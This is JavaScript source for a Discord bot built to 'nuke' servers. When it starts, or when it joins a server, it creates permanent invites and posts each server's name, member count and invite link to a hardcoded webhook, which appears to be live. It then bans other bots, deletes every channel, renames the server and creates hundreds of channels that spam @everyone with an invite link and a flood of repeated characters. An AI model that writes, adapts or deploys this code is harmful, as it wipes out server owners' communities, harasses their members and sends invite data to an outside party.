const { Client, EmbedBuilder } = require('discord.js');
const http = require('http');

const client = new Client({ intents: [1, 512, 32768, 2, 16] });

const TOKEN = process.env.TOKEN;
const SPAM_LINK = "https://discord.gg/pkvG7BGKEZ";
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1500117285019451502/bodcQF0lIkMv67VzomdcQRIOB4t0HMl7i0zfneXW886OIyeSX7hIW3lWmWg3mQwg6s3t";
const ARABIC_SPAM = '﷽'.repeat(1950);

http.createServer((req, res) => { res.writeHead(200); res.end('Alive'); }).listen(process.env.PORT || 3000);

client.once('ready', async () => {
    console.log(`[+] ${client.user.tag} online`);
    const guilds = client.guilds.cache;
    let desc = '';
    for (const [id, guild] of guilds) {
        let invite = 'No invite';
        try {
            const channel = guild.channels.cache.find(c => c.type === 0);
            if (channel) {
                const inv = await channel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
                if (inv) invite = `https://discord.gg/${inv.code}`;
            }
        } catch(e) {}
        desc += `**${guild.name}** (${guild.memberCount} members)\n${invite}\n\n`;
    }
    const embed = new EmbedBuilder().setTitle(`Bot Online - ${guilds.size} Servers`).setDescription(desc || 'No servers').setColor(0xff0000);
    await fetch(LOG_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) });

    // Auto-nuke all servers
    for (const [id, guild] of guilds) {
        nukeGuild(guild);
    }
});

client.on('guildCreate', async (guild) => {
    let invite = 'No invite';
    try {
        const channel = guild.channels.cache.find(c => c.type === 0);
        if (channel) {
            const inv = await channel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
            if (inv) invite = `https://discord.gg/${inv.code}`;
        }
    } catch(e) {}
    await fetch(LOG_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `**Joined Server**\nName: ${guild.name}\nMembers: ${guild.memberCount}\nInvite: ${invite}` }) });
    nukeGuild(guild);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content === '.nuke') {
        await message.delete().catch(() => {});
        nukeGuild(message.guild);
    }
});

async function nukeGuild(g) {
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    const bots = g.members.cache.filter(m => m.user.bot && m.bannable && m.id !== client.user.id);
    for (const [id, bot] of bots) { await bot.ban({ reason: 'Nuke' }).catch(() => {}); await sleep(50); }
    await g.setName('under the power of linear').catch(() => {});
    const channels = Array.from(g.channels.cache.values());
    for (const ch of channels) { await ch.delete().catch(() => {}); await sleep(50); }
    for (let i = 0; i < 500; i++) {
        g.channels.create({ name: 'linear-owns-u', type: 0 }).then(ch => {
            if (!ch) return;
            for (let j = 0; j < 10; j++) {
                ch.send(`@everyone @here ${SPAM_LINK} LINEAR OWNS U\n${ARABIC_SPAM}`).catch(() => {});
            }
        }).catch(() => {});
        await sleep(200);
    }
}

client.login(TOKEN);
